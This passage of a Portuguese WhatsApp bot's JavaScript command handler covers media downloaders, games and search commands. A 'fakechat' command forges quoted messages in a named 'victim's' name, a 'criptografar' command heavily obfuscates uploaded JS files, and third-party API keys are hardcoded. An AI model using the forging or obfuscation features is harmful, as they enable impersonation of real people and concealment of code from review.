enviar(`O comando *${args[0]}* foi desbloqueado com sucesso no grupo.`)
break

case 'listblockcmdgp': case 'listbcmdgp':
if(!isGroup) return enviar(arise.grupo);
if(getComandoBlock(from).length == 0) return enviar("Não existe ainda nenhum *comando bloqueado* neste grupo.");
tkks = `[Total: *${getComandoBlock(from).length}*] - Comandos bloqueados pelo adminstrador(s) do grupo:\n–\n`
tkks += getComandoBlock(from).map((v, index) =>  `\t• [ *N° ${index+1}* ] - Comando: ${prefix + getComandoBlock(from)[v]}`).join('\n–\n')
safeSendMessage(from, {text: tkks.trim()}, {quoted: non})
break

case 'blockcmdg':
if(!SoDono) return enviar(arise.donosmt)
tp = args.join(" ")
if(tp.includes("blockcmdg blockcmdg") || (tp.includes("blockcmdg  blockcmdg"))) return enviar(`Tá louco maluco? Não tem como adicionar o mesmo comando.`)
if(isBlockCmdG.includes(args[0]))return enviar('Este comando já está incluso na lista de *comandos bloqueados global*.')
isBlockCmdG.push(args[0])
fs.writeFileSync('./dono/nescessario.json', JSON.stringify(nescessario, null, 2))
enviar(`O comando *${args[0]}* foi adicionado na lista de comandos bloqueados global.`)
break

case 'unblockcmdg':
if(!SoDono) return enviar(arise.donosmt)
tp = args.join(" ")
if(tp.includes("unblockcmdg unblockcmdg") || (tp.includes("unblockcmdg  unblockcmdg"))) return enviar(`Tá louco maluco? Não tem como desbloquear o mesmo comando.`)  
if(!isBlockCmdG.includes(args[0]))return enviar('Este comando não está incluso na lista de *cmds bloqueados global*.')
var ab = isBlockCmdG.indexOf(args[0])
isBlockCmdG.splice(ab, 1)
fs.writeFileSync('./dono/nescessario.json', JSON.stringify(nescessario, null, 2))
enviar(`O comando *${args[0]}* foi tirado da lista de cmds bloqueados global.`)
break

case 'listbcmdglobal':
if(isBlockCmdG.length == 0) return enviar("Não existe nenhum *comando bloqueado* na lista")
tkks = `[Total: *${isBlockCmdG.length}*] - Lista de comandos bloqueados pelo(s) meus proprietários:\n–\n`
tkks += isBlockCmdG.map((v, index) =>  `\t• [ *N° ${index+1}* ] - Comando: ${v}`).join('\n–\n')
safeSendMessage(from, {text: tkks.trim()}, {quoted: non})
break

case 'avalie':
const avalie = body.slice(8)
if(!q) return enviar(`🔹 Uso correto: ${prefix}avalie "muito bom, parabéns."`)
if(args.length >= 400) return safeSendMessage(from, {text: 'Máximo 400 caracteres'}, {quoted: non})
var nomor = info.participant
tdptls = `[ Avaliação ]\nDe: wa.me/${sender.split("@s.whatsapp.net")[0]}\n: ${avalie}`
safeSendMessage(nmrdn, {text: tdptls}, {quoted: non})
enviar("Mensagem enviada ao meu dono, obrigado pela avaliação, iremos melhorar a cada dia.")
break

case 'bug':
const bug = body.slice(5)
if(!q) return enviar(`🔹 Uso correto: ${prefix}bug "ocorreu um erro no comando sticker"`)
if(args.length >= 800) return safeSendMessage(from, {text: 'Máximo 800 caracteres'}, {quoted: non})
var nomor = info.participant
teks1 = `[ Problema ]\nDe: wa.me/${sender.split("@s.whatsapp.net")[0]}\nErro ou bug: ${bug}`
safeSendMessage(nmrdn, {text: teks1}, {quoted: non})
enviar("Mensagem enviada ao meu dono..")
break

case 'sugestão':
case 'sugestao':
const sugestao = body.slice(10)
if(!q) return enviar(`🔹 Uso correto: ${prefix}sugestao "Opa, crie um comando tal.."`)
if(args.length >= 800) return safeSendMessage(from, {text: 'Máximo 800 caracteres'}, {quoted: non})
sug = `[ Sugestões de Novos Comandos ]\n@${sender.split("@s.whatsapp.net")[0]}\n${sugestao}`
safeSendMessage(nmrdn, {text: sug, mentions: sender}, {quoted: non})
enviar("Mensagem enviada ao meu dono, obrigado pela sugestão..")
break

//==========(BAIXAR/PESQUISAS)==========\\

case 'cases':
if(!SoDono) return enviar("Você não é dono para utilizar este comando...")
try {
const listCases = () => {
const fileContent = fs.readFileSync("index.js").toString();
const caseNames = fileContent.match(/case\s+'(.+?)'/g);
if (caseNames) {
return caseNames.map((caseName, index) => `${index + 1}. ${caseName.match(/'(.+?)'/)[1]}`).join('\n');
} else {
enviar("Nenhuma case encontrada.") } }
safeSendMessage(from, { text: listCases() }, { quoted: non });
} catch (e) {
console.log(e)
enviar('Ocorreu um erro ao obter as cases.') }
break

case 'hd': case 'remini': {
if(isCmdPremium && !isPremium && !isGroupAdmins) return enviar(arise.premium)
if ((isMedia && !info.message.videoMessage || isQuotedImage)) {
try {
const post = isQuotedImage ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.imageMessage : info.message.imageMessage;
const imagem = await downloadContentFromMessage(post, 'image')
base64 = Buffer.from([])
for await(const send of imagem) { 
base64 = Buffer.concat( [ base64, send ] ) 
};
await reagir(from, '⏳')
const link = await upload(base64)
await safeSendMessage(from, {image: `https://zero-two-apis.com.br/api/ia/tohd?url=${link}&apikey=${KEY_ZERO}`}, {quoted: non});
await reagir(from, '✅')
} catch (error) {
await reagir(from, '❌')
console.error(e)
enviar('Não foi possível melhorar a qualidade da imagem.')
}
} else {
enviar('Mencione uma imagem para atribuir o efeito a foto.')
}
}
break

case 'anime': {
if (!q) return enviar(`Exemplo: ${prefix + command} one piece`);
try {
const malScraper = require('mal-scraper');
const anime = await malScraper.getInfoFromName(args.join(' ')).catch(() => null);
    await reagir(from, "✅️");

// Manipula a URL da imagem
let imgUrl = anime.picture;
if (imgUrl.includes("/r/")) {
imgUrl = imgUrl.replace(/\/r\/\d+x\d+/, "");
}

let animetxt = `🇯🇵 *Titulo: ${anime.title}*
🎋 *Tipo: ${anime.type}*
🎐 *Estreou em: ${anime.premiered}*
💠 *Total Episodios: ${anime.episodes || "indisponível"}*
📈 *Status: ${anime.status}*
💮 *Gêneros: ${anime.genres}*
📍 *Studio: ${anime.studios}*
🌟 *Pontuação: ${anime.score}*
💎 *Avaliação: ${anime.rating}*
🏅 *Classificação: ${anime.ranked}*
💫 *Popularidade: ${anime.popularity}*
♦️ *Trailer: ${anime.trailer || "indisponível"}*
🌐 *URL: ${anime.url}*`;

// Manda já a capa em maior resolução
await safeSendMessage(from, {image: {url: imgUrl}, caption: animetxt}, {quoted: non});
} catch (error) {
console.error(error);
await reagir(from, "❌️");
}
}
break;

case 'pin': case 'pinterest': {
if(!q) return enviar(`🔹 Uso correto:  ${prefix + command} Luffy`)
await escrever()
reagir(from, "✅");
const randin = Math.floor(Math.random() * 100000);
try {
safeSendMessage(from, {image: {url: `https://zero-two-apis.com.br/api/pinterest?text=${q}&apikey=${KEY_ZERO}&r=${randin}`}, caption: `🎨 Mais opçoes abaixo:`, footer: `${NomeDoBot}`,
buttons: [
{
buttonId: `${prefix}pin ${q}`,
buttonText: { displayText: '「 ⏭️ 」𝐏𝐑𝐎𝐗𝐈𝐌𝐎「 ⏭️ 」' },
type: 1
},
{
buttonId: `${prefix}menu`,
buttonText: { displayText: '「 🫟 」𝐌𝐄𝐍𝐔「 🫟 」' },
type: 1
}], headerType: 1, viewOnce: true}, {quoted: non})
} catch (e) {
enviar(`Pin Não Encontrado`)
console.log(e)}
}
break

case 'pin_video':
if(!q) return enviar(`🔹 Uso correto: ${prefix}pin_video url`)
await randomreact();
const data = await fetchJson(`https://zero-two-apis.com.br/api/pinterest_mp4?url=${q}&apikey=${KEY_ZERO}`);
enviar('Estou processando seu video..')
safeSendMessage(from, {video: {url: data.resultados.videoLinks[0].link}}, {quoted: non})
break

case 'akinator':
if(!isGroup) return enviar(arise.grupo)
if(!JSON.stringify(akinator).includes(from) && akinator.length > 0 && Number(akinator[0].dia) === Number(moment.tz('America/Sao_Paulo').format('DD'))) return enviar("Volte mais tarde...")
if(!JSON.stringify(akinator).includes(from) && akinator.length > 0 && Number(akinator[0].dia) !== Number(moment.tz('America/Sao_Paulo').format('DD'))) {
jogo.now = true
akinator.splice(0, 1)
fs.writeFileSync("./banco de dados/grupos/games/akinator.json", JSON.stringify(akinator, null, 2))
}
if(!JSON.stringify(akinator).includes(from)) {
enviar(`Atenção ${pushname}, irei iniciar o jogo do akinator, _siga as instruções abaixo:_\n• Responda os questionamentos com: _"Sim", "Não", "Não sei", "Provavelmente sim" ou "Provavelmente não"_...\n• ${II}Observação:${II} Não use as aspas, utilize sem as aspas por favor.`)
dateAKI = moment.tz('America/Sao_Paulo').format('DD')
var region = 'pt'
var childMode = false;
var proxy = undefined;
let startAki = async () => {
aki = new Aki({region, childMode, proxy});
await aki.start()
}
await startAki()
jogo.now = false
jogo.jogador = sender
akinator.push({id: from, jogador: sender, finish: 0, dia: dateAKI})
fs.writeFileSync("./banco de dados/grupos/games/akinator.json", JSON.stringify(akinator, null, 2))
enviar(`🧞‍♂️ *𝐀𝐊𝐈𝐍𝐀𝐓𝐎𝐑 𝐐𝐔𝐄𝐒𝐓𝐈𝐎𝐍𝐒:*\n• Questão: *${aki.question}*`)
} else return mention(`@${akinator[akinator.map(i => i.id).indexOf(from)].jogador.split('@')[0]} já iniciou uma partida, espere ele(a) finalizar a atual para iniciar outra...`)
break

case 'resetaki':
if(!isGroup) return enviar(arise.grupo)
if(!JSON.stringify(akinator).includes(from) && !SoDono) return enviar("Não existe nenhuma sessão ainda em andamento no grupo.")
nosei = SoDono ? 0 : akinator.map(i => i.id).indexOf(from)
if(akinator[nosei].jogador == sender || isGroupAdmins || SoDono) {
jogo.now = true
akinator.splice(nosei, 1)
  fs.writeFileSync("./banco de dados/grupos/games/akinator.json", JSON.stringify(akinator, null, 2))
enviar(`O akinator foi resetado com sucesso, a sessão foi deletada.`)
} else {
enviar("Somente o(s) adm(s) ou a pessoa que iniciou o jogo podem resetar.")
}
break

case 'jogo': case 'jogos': case 'game': case 'games': 
// @Darkzy7
if (!q) return enviar(`Você esqueceu de colocar o nome do jogo após o comando.`)
const gamesearch = await axios.get(`https://api.rawg.io/api/games?key=34e936a681924c8cba8711d2dacb999e&search=${q}&page_size=1`)
let searchapi = gamesearch.data.results[0]
if (gamesearch.data.results.length == 0) return await enviar("Sem resultados para sua pesquisa, tente novamente mais tarde...");
titulo = searchapi.name
let genero = '';
for (let i = 0; i < searchapi.genres.length; i++) {
genero += `${searchapi.genres[i].name}, `;}
genero += `${searchapi.genres[searchapi.genres.length - 1].name}`;
let plataforma = '';
for (let i = 0; i < searchapi.platforms.length; i++) {
plataforma += `${searchapi.platforms[i].platform.name}, `;}
plataforma += `${searchapi.platforms[searchapi.platforms.length - 1].platform.name}`;
let compreaqui = '';
if (searchapi.stores !== null) {
for (let i = 0; i < searchapi.stores.length; i++) {
compreaqui += `${searchapi.stores[i].store.name}, `;}
compreaqui += `${searchapi.stores[searchapi.stores.length - 1].store.name}`;
let tempodejogatina = searchapi.playtime
let datadelancamento = searchapi.released
let avaliacaodojogo = searchapi.rating
let rating_top = searchapi.rating_top
let esrb = gamesearch.data.results[0].esrb_rating === null ? '' : gamesearch.data.results[0].esrb_rating.name;
safeSendMessage(from, {image: await getBuffer(searchapi.background_image), caption: mess.gamesResult(titulo, genero, plataforma, compreaqui, tempodejogatina, datadelancamento, avaliacaodojogo, rating_top, esrb)}, {quoted: non})
}
break;

case 'face_video': {
try {
if(!q.includes("facebook") && !q.includes("fb.watch")) return enviar(`🔹 Uso correto: ${prefix + command} link`);
reagir(from, '✅')
let wsc = await fbdown(q);
safeSendMessage(from, {video: {url: wsc.Normal_video}, mimetype: "video/mp4"}).catch(e => {
return enviar("Erro..")
})
} catch (e) {
return enviar("Erro..")
}
}
break;

case 'playstore':
if (!q) return enviar("Cade o título do apk que deseja pesquisar?");
await escrever()
reagir(from, "✅️")
data = await fetchJson(`https://zero-two-apis.com.br/api/playstore?nome=${q}&apikey=${KEY_ZERO}`);
let a = data.resultado[0];
ABC = `\n📬 Nome: ${a.nome}\n----------------------------------------------
👨🏻‍💻 Desenvolvedor: ${a.desenvolvedor}\n----------------------------------------------
⭐️ Estrelas: ${a.estrelas}\n----------------------------------------------
📥 URL: ${a.link}\n`;
safeSendMessage(from, {image: {url: a.imagem}, caption: ABC}, {quoted: non});
break;

case 'ytmp3':
if(!q) return enviar(`🔹 Uso correto: ${prefix}ytmp3 link`)
try {
await reagir(from, "✅️")
await downloadMP3(q, from);
} catch (error) {
await reagir(from, "♻️")
let upmg = await youtube(q);
await safeSendMessage(from, {audio: {url: upmg.mp3}, mimetype: "audio/mpeg", ptt: true}, {quoted: non});
}
break

case 'play':
if (!q) return enviar(`🔹 Uso correto: ${prefix + command} nome`);
reagir(from, "🕜")
const videz = await getFirstVideo(q);
safeSendMessage(from, {image: {url: `https://neon-apis.shop/canvas/musicard?nome=${videz.title}&autor=${videz.author.name}&logo=${videz.thumbnail}&thumb=https://qu.ax/oQFxy.jpg&end=${videz.timestamp}`}, caption: `┏═══♚═══╼✪✮✪╾═══♚═══┓
│╭┈˖⁺˖˚｡⋆🌨️︎｡°✩₊✩°｡🌨️⋆｡˚˖⁺˖┈╮
┃᨞⁞🎧⃞⃞⚝ *𝚃í𝚝𝚞𝚕𝚘:* ${videz.title}
┃᨞⁞⏳⃞⃞⚝ *𝚃𝚎𝚖𝚙𝚘:* ${videz.timestamp}
┃᨞⁞👁⃞⃞⚝ *𝚅𝚒𝚎𝚠𝚜:* ${videz.views}
┃᨞⁞👤⃞⃞⚝ *𝙲𝚊𝚗𝚊𝚕:* ${videz.author.name}
┃᨞⁞📆⃞⃞⚝ *𝙿𝚘𝚜𝚝𝚊𝚍𝚘:* ${videz.ago || "não encontrado"}
┃᨞⁞💬⃞⃞⚝ *𝙳𝚎𝚜𝚌:* ${videz.description || "não encontrado"}
│╰┈˖⁺˖˚｡⋆🌨️︎｡°✩₊✩°｡🌨️⋆｡˚˖⁺˖┈╯
┗═══♚═══╼✪✮✪╾═══♚═══┛`, footer: `${NomeDoBot}`,
buttons: [
{
buttonId: `${prefix}ytmp3 ${videz.url}`,
buttonText: { displayText: '「 🎧 」𝐀𝐔𝐃𝐈𝐎「 🎧 」' },
type: 1
},
{
buttonId: `${prefix}ytmp4 ${videz.url}`,
buttonText: { displayText: '「 🎬 」𝐕𝐈𝐃𝐄𝐎「 🎬 」' },
type: 1
},
{
buttonId: `${prefix}ytdoc ${videz.url}`,
buttonText: { displayText: '「 📂 」𝐃𝐎𝐂𝐔𝐌𝐄𝐍𝐓「 📂 」' },
type: 1 }], headerType: 1, viewOnce: true, contextInfo: {
isForwarded: true,
forwardingScore: 1,
forwardedNewsletterMessageInfo: {
newsletterJid: newscanal,
newsletterName: nomecanal,
serverMessageId: ''
}
}
}, {quoted: non});
await reagir(from, "✅️");
break

case 'play_audio':
case 'play2_audio':
case 'play3_audio':
case 'play4_audio':
reagir(from, "🕜")
const videy = await getFirstVideo(q);
let rez = await youtube(videy.url);  
safeSendMessage(from, {image: {url: `https://neon-apis.shop/canvas/musicard?nome=${videy.title}&autor=${videy.author.name}&logo=${videy.thumbnail}&thumb=https://qu.ax/oQFxy.jpg&end=${videy.timestamp}`}, caption: `┏═══♚═══╼✪✮✪╾═══♚═══┓
│╭┈˖⁺˖˚｡⋆🌨️︎｡°✩₊✩°｡🌨️⋆｡˚˖⁺˖┈╮
┃᨞⁞🎧⃞⃞⚝ *𝚃í𝚝𝚞𝚕𝚘:* ${videy.title}
┃᨞⁞⏳⃞⃞⚝ *𝚃𝚎𝚖𝚙𝚘:* ${videy.timestamp}
┃᨞⁞👁⃞⃞⚝ *𝚅𝚒𝚎𝚠𝚜:* ${videy.views}
┃᨞⁞👤⃞⃞⚝ *𝙲𝚊𝚗𝚊𝚕:* ${videy.author.name}
┃᨞⁞📆⃞⃞⚝ *𝙿𝚘𝚜𝚝𝚊𝚍𝚘:* ${videy.ago || "não encontrado"}
┃᨞⁞💬⃞⃞⚝ *𝙳𝚎𝚜𝚌:* ${videy.description || "não encontrado"}
│╰┈˖⁺˖˚｡⋆🌨️︎｡°✩₊✩°｡🌨️⋆｡˚˖⁺˖┈╯
┗═══♚═══╼✪✮✪╾═══♚═══┛`, footer: `${NomeDoBot}`, buttons: [
{
buttonId: `${prefix}menu`,
buttonText: { displayText: '「 🫟 」𝐌𝐄𝐍𝐔「 🫟 」' },
type: 1
},
{
buttonId: `${prefix}ping`,
buttonText: { displayText: '「 ⚡️ 」𝐏𝐈𝐍𝐆「 ⚡️ 」' },
type: 1
}], headerType: 1, viewOnce: true, contextInfo: {
isForwarded: true,
forwardingScore: 1,
forwardedNewsletterMessageInfo: {
newsletterJid: newscanal,
newsletterName: nomecanal,
serverMessageId: ''
}
}
}, {quoted: non});
await sleep(1000)
downloadMP3(videy.url, from)
await reagir(from, "✅️");
break;

case 'play_video':
if(!q) return enviar(`🔹 Uso correto: ${prefix + command} nome`)
reagir(from, "🕜")
const videa = await getFirstVideo(q);
let rss = await youtube(videa.url);
safeSendMessage(from, {image: {url: `https://neon-apis.shop/canvas/musicard?nome=${videa.title}&autor=${videa.author.name}&logo=${videa.thumbnail}&thumb=https://qu.ax/oQFxy.jpg&end=${videa.timestamp}`}, caption: `┏═══♚═══╼✪✮✪╾═══♚═══┓
│╭┈˖⁺˖˚｡⋆🌨️︎｡°✩₊✩°｡🌨️⋆｡˚˖⁺˖┈╮
┃᨞⁞🎧⃞⃞⚝ *𝚃í𝚝𝚞𝚕𝚘:* ${videa.title}
┃᨞⁞⏳⃞⃞⚝ *𝚃𝚎𝚖𝚙𝚘:* ${videa.timestamp}
┃᨞⁞👁⃞⃞⚝ *𝚅𝚒𝚎𝚠𝚜:* ${videa.views}
┃᨞⁞👤⃞⃞⚝ *𝙲𝚊𝚗𝚊𝚕:* ${videa.author.name}
┃᨞⁞📆⃞⃞⚝ *𝙿𝚘𝚜𝚝𝚊𝚍𝚘:* ${videa.ago || "não encontrado"}
┃᨞⁞💬⃞⃞⚝ *𝙳𝚎𝚜𝚌:* ${videa.description || "não encontrado"}
│╰┈˖⁺˖˚｡⋆🌨️︎｡°✩₊✩°｡🌨️⋆｡˚˖⁺˖┈╯
┗═══♚═══╼✪✮✪╾═══♚═══┛`, footer: `${NomeDoBot}`, buttons: [
{
buttonId: `${prefix}menu`,
buttonText: { displayText: '「 🫟 」𝐌𝐄𝐍𝐔「 🫟 」' },
type: 1
},
{
buttonId: `${prefix}ping`,
buttonText: { displayText: '「 ⚡️ 」𝐏𝐈𝐍𝐆「 ⚡️ 」' },
type: 1
}], headerType: 1, viewOnce: true, contextInfo: {
isForwarded: true,
forwardingScore: 1,
forwardedNewsletterMessageInfo: {
newsletterJid: newscanal,
newsletterName: nomecanal,
serverMessageId: ''
}
}
}, {quoted: non});
await sleep(1000)
safeSendMessage(from, {video: {url: rss.mp4}, mimetype: "video/mp4"}, {quoted: non});
await reagir(from, "✅️");
break

case 'play_doc':
if(!q) return enviar(`🔹 Uso correto: ${prefix + command} nome`)
reagir(from, "🕜")
const videc = await getFirstVideo(q);
safeSendMessage(from, {image: {url: `https://neon-apis.shop/canvas/musicard?nome=${videc.title}&autor=${videc.author.name}&logo=${videc.thumbnail}&thumb=https://qu.ax/oQFxy.jpg&end=${videc.timestamp}`}, caption: `┏═══♚═══╼✪✮✪╾═══♚═══┓
│╭┈˖⁺˖˚｡⋆🌨️︎｡°✩₊✩°｡🌨️⋆｡˚˖⁺˖┈╮
┃᨞⁞🎧⃞⃞⚝ *𝚃í𝚝𝚞𝚕𝚘:* ${videc.title}
┃᨞⁞⏳⃞⃞⚝ *𝚃𝚎𝚖𝚙𝚘:* ${videc.timestamp}
┃᨞⁞👁⃞⃞⚝ *𝚅𝚒𝚎𝚠𝚜:* ${videc.views}
┃᨞⁞👤⃞⃞⚝ *𝙲𝚊𝚗𝚊𝚕:* ${videc.author.name}
┃᨞⁞📆⃞⃞⚝ *𝙿𝚘𝚜𝚝𝚊𝚍𝚘:* ${videc.ago || "não encontrado"}
┃᨞⁞💬⃞⃞⚝ *𝙳𝚎𝚜𝚌:* ${videc.description || "não encontrado"}
│╰┈˖⁺˖˚｡⋆🌨️︎｡°✩₊✩°｡🌨️⋆｡˚˖⁺˖┈╯
┗═══♚═══╼✪✮✪╾═══♚═══┛`, footer: `${NomeDoBot}`, buttons: [
{
buttonId: `${prefix}menu`,
buttonText: { displayText: '「 🫟 」𝐌𝐄𝐍𝐔「 🫟 」' },
type: 1
},
{
buttonId: `${prefix}ping`,
buttonText: { displayText: '「 ⚡️ 」𝐏𝐈𝐍𝐆「 ⚡️ 」' },
type: 1
}], headerType: 1, viewOnce: true, contextInfo: {
isForwarded: true,
forwardingScore: 1,
forwardedNewsletterMessageInfo: {
newsletterJid: newscanal,
newsletterName: nomecanal,
serverMessageId: ''
}
}
}, {quoted: non});
await sleep(1000)
await downloadDOC(videc.url, from)
break

case 'ytmp4':
if(!q) return enviar(`🔹 Uso correto: ${prefix}ytmp4 link`)
try {
await reagir(from, "✅️");
let ueh = await youtube(args[0]);
await safeSendMessage(from, {video: {url: ueh.mp4}, mimetype: "video/mp4"}, {quoted: non});
} catch (error) {
await reagir(from, "♻️")
await safeSendMessage(from, {video: {url: `https://api.bronxyshost.com.br/api-bronxys/play_video?nome_url=${q}&apikey=${KEY_BRONXYS}`}, mimetype: "video/mp4"}, {quoted: non});
}
break

case 'ytdoc':
if(!q) return enviar(`🔹 Uso correto: ${prefix}ytdoc link`)
try {
await reagir(from, "✅️")
await downloadDOC(q, from);
} catch (error) {
await reagir(from, "♻️")
let rsh = await youtube(q);
await safeSendMessage(from, {document: {url: rsh.mp3}, mimetype: "audio/mpeg", fileName: 'audio.mp3'}, {quoted: non});
}
break

case 'playmix':
if (!q) return enviar(`❌ Use: ${prefix + command} nome`);
const res = await yts(q);
if (!res.videos) {
return enviar(`❌ Nenhum resultado encontrado.`);
}
reagir(from, '✅')
let resultados;
if (res.videos.length >= 10) {
resultados = res.videos.slice(0, 10);
} else if (res.videos.length >= 7) {
resultados = res.videos.slice(0, 7);
} else {
resultados = res.videos.slice(0, 3);
}
const rows = resultados.map(video => ({
title: video.title,
description: `${NomeDoBot}`,
rows: [
{
title: `🎵 Baixar MP3`,
description: `Áudio de: ${video.title}`,
id: `${prefix}ytmp3 ${video.url}`
},
{
title: `🎥 Baixar MP4`,
description: `Vídeo: ${video.title}`,
id: `${prefix}ytmp4 ${video.url}`
},
{
title: `📄 Info Completa`,
description: `Detalhes de: ${video.title}`,
id: `${prefix}ytdoc ${video.url}`
}
]
}));
// Convertendo para estrutura de seções múltiplas
const sections = resultados.map((video, i) => ({
title: `${NomeDoBot}`,
highlight_label: "YouTube",
rows: [
{
title: `${video.title}`,
description: `BAIXAR AUDIO - DURAÇÃO: ${video.timestamp || "não encontrei."}`,
id: `${prefix}ytmp3 ${video.url}`
},
{
title: `${video.title}`,
description: `BAIXAR VIDEO - DURAÇÃO: ${video.timestamp || "não encontrei."}`,
id: `${prefix}ytmp4 ${video.url}`
},
{
title: `${video.title}`,
description: `BAIXAR DOC - DURAÇÃO: ${video.timestamp || "não encontrei."}`,
id: `${prefix}ytdoc ${video.url}`
}
]
}));

await client.relayMessage(from, {interactiveMessage: {header: proto.Message.InteractiveMessage.Header.create({
...(await prepareWAMessageMedia({ image: {url: 'https://qu.ax/qenfg.jpg'}}, {upload: client.waUploadToServer})),
  hasMediaAttachment: true,
  title: `╭────────────────────╮\n│ 📥 *YOUTUBE PESQUISAS*\n┝━━━━━━━━━─━━━━━━\n│ 🎬 *RESULTADOS TOTAL:* ${resultados.length}\n┝━━━━━━━━─━━━━━━━`
}),
body: { text: `│ *ESCOLHA UMA DAS OPÇŌES:*
╰────────────────────╯` },
nativeFlowMessage: {
buttons: [
{
name: "single_select",
buttonParamsJson: JSON.stringify({
title: "「 💙 」𝐓𝐎𝐃𝐀𝐒 𝐎𝐏𝐂「 💙 」",
sections: sections
}),
messageParamsJson: ""
},
{
"name": "cta_url",
"buttonParamsJson": "{\"display_text\":\"「 ☁️ 」𝐇𝐎𝐒𝐓 𝐒𝐂𝐀𝐋𝐄「 ☁️ 」\",\"url\":\"https://hostscale.shop\",\"merchant_url\":\"https://hostscale.shop\"}"
}
]
}
}
}, {quoted: info});
break;

case 'tiksearch':
if (!q) return enviar(`Ex: ${prefix}tiktok <link ou nome>`);
const rsw = await fetchJson(`https://neon-apis.shop/api/tiktok-search?query=${q}`);
try {
await reagir(from, '✅');
await safeSendMessage(from, {video: {url: `${rsw.resultado.videos}`}, caption: `💌⃟ Descrição: ${rsw.resultado.titulo}`}, {quoted: non});
await safeSendMessage(from, {audio: {url: rsw.resultado.audio}, mimetype: 'audio/mpeg', ptt: true});
} catch (error) {
await reagir(from, '❌');
}
break

case 'tiktok_video': 
try {
if(!q) return enviar(`🔹 Uso correto: ${prefix + command} link`);
reagir(from, '✅')
let rws = await ttdl(q);
await safeSendMessage(from, {video: {url: rws.video}, mimetype: "video/mp4"}, {quoted: non});
} catch (error) {
  console.error(error);
 enviar("Ocorreu um erro, a api caiu ou verifique se o link é de um vídeo.")
}
break;

case 'tiktok_audio': {
try {
if(!q) return enviar(`🔹 Uso correto: ${prefix + command} link`);
await randomreact();
const data = await fetchJson(`https://zero-two-apis.com.br/api/download/tiktok/v2?url=${q}&apikey=${KEY_ZERO}`)
reagir(from, '✅')
await safeSendMessage(from, {audio: {url: data.resultado.music.playUrl}, 
mimetype: "audio/mpeg"}, {quoted: non});
} catch (error) {
  console.error(error);
 enviar("Ocorreu um erro, a api caiu ou verifique se o link é de um vídeo.")
}
}
break;

case 'fakechat': case 'fakemsg':
if(!isGroup) return enviar(arise.grupo);
var [repplace, tarrget, bott] = q.split("|")
var m_ = info.message.extendedTextMessage && info.message.extendedTextMessage.contextInfo && info.message.extendedTextMessage.contextInfo.mentionedJid ? info.message.extendedTextMessage.contextInfo.mentionedJid[0] : null
if (m_ && tarrget && bott) {
safeSendMessage(from, {text: bott}, {quoted: {key: {fromMe: false, participant: m_}, message: {conversation: tarrget}}});
} else {
enviar(`Crie mensagens fakes com qualquer uma pessoa! Explicando abaixo:\n—\n• Você precisaria mencionar a pessoa e adicionar a mensagem que ele supostamente iria enviar e que você responderia a seguinte mensagem, todos usando a *|* para separar o que foi pedido dito nesse textinho...\n• *Ex:* ${prefix + command} @vitima|msg1|msg2`);
}
break;

case 'spoiler': case 'morechat':
var [text1_a, text2_b] = q.split("/"); // Separador
if (!text1_a) text1_a = ""; // Caso o texto1 esteja vazio, vai retornar vázio o parâmetro.
if (!text2_b) text2_b = ""; // Caso o texto2 esteja vazio, vai retornar vázio o parâmetro.
enviar(text1_a + String.fromCharCode(8206).repeat(4001) + text2_b); // Enviar o spoiler.
break;

case 'criptografar':
reagir(from, '✅️')
if (isMedia && !info.message.videoMessage || isQuotedDocument) {
  const media = isQuotedDocument
    ? info.message.extendedTextMessage.contextInfo.quotedMessage.documentMessage
    : info.message.documentMessage;

  const buffer = await getFileBuffer(media, 'document');
  const code = buffer.toString();

  const nivel = (args[0] || 'medio').toLowerCase();
  let options = {};

  if (nivel === 'leve') {
    options = { compact: true };
  } else if (nivel === 'forte') {
    options = {
      compact: true,
      controlFlowFlattening: true,
      controlFlowFlatteningThreshold: 1,
      deadCodeInjection: true,
      deadCodeInjectionThreshold: 1,
      stringArray: true,
      stringArrayEncoding: ['base64'],
      stringArrayThreshold: 1
    };
  } else {
    options = {
      compact: true,
      controlFlowFlattening: true,
      controlFlowFlatteningThreshold: 0.75,
      deadCodeInjection: true,
      deadCodeInjectionThreshold: 0.4,
      stringArray: true,
      stringArrayThreshold: 0.75
    };
  }

  const obfuscationResult = JavaScriptObfuscator.obfuscate(code, options);
  const encryptedCode = obfuscationResult.getObfuscatedCode();

  const outputPath = path.join(__dirname, 'exports', `${Date.now()}_criptografado.js`);
  fs.writeFileSync(outputPath, encryptedCode);

  await safeSendMessage(from, {
    document: { url: outputPath },
    mimetype: 'application/javascript',
    fileName: 'criptografado.js'
  }, { quoted: non });

await sleep(20000)
fs.unlinkSync(outputPath);
  
} else {
  enviar('Por favor, marque o documento .js que deseja criptografar.');
}
break;

case 'obesidade': case 'obeso': // @Crap </>
if(!q.includes("|")) return enviar(`Ex.: *${prefix + command} peso|altura*`)
var [peso, altura] = q.split("|");
const resultado = obeso(peso, altura)
if (resultado <= 17 || resultado <= 18.4) {
await safeSendMessage(from, {react: {text: `😸`, key: info.key}})
enviar(`• Seu índice de massa corporal é de: *${resultado}* -> Você está abaixo do peso.`)
} else if (resultado <= 18.5 || resultado <= 24.9) {
await safeSendMessage(from, {react: {text: `👍`, key: info.key}})
enviar(`• Seu índice de massa corporal é: *${resultado}* -> Você está no peso ideal.`)
} else if (resultado <= 25 || resultado <= 29.9) {
await safeSendMessage(from, {react: {text: `🫤`, key: info.key}})
enviar(`• Seu índice de massa corporal é: *${resultado}* -> Você está com sobrepeso.`);
} else if (resultado <= 30 || resultado <= 39.9) {
await safeSendMessage(from, {react: {text: `🤨`, key: info.key}})
enviar(`• Seu índice de massa corporal é: *${resultado}* -> Obesidade.`);
} else if (resultado > 40) {
await safeSendMessage(from, {react: {text: `😵`, key: info.key}})
enviar(`• Seu índice de massa corporal é: *${resultado}* -> Obesidade mórbida!`);
}
break;

case 'contardias': case 'countdays': // @Crap</>
if(!q.includes("/")) return enviar(`Você esqueceu da */* para separar os campos.. Exemplo: *31/03/2024*`)
if(q.length < 10) return enviar(`Deve conter a data completa *(dia/mês/ano)* após o comando!\n• Exemplo: *${prefix + command} 31/03/2024*`)
try {
const tempo = timeDate('DD/MM/YYYY')
countDay = countDays(q.split("/"), tempo.split("/"))
enviar(`Falta *${countDay}* dia(s).`)
} catch(e) {
return enviar(mess.error())
}
break;

case 'serie':
if (!q) return await enviar(`Cadê o nome da serie o qual você deseja ver informações?`)
serieInfo = await axios.get(`https://api.themoviedb.org/3/search/tv?api_key=ddfcb99fae93e4723232e4de755d2423&query=${encodeURIComponent(q)}&language=pt`);
if (serieInfo.data.total_results == 0) return enviar(mess.noresult())
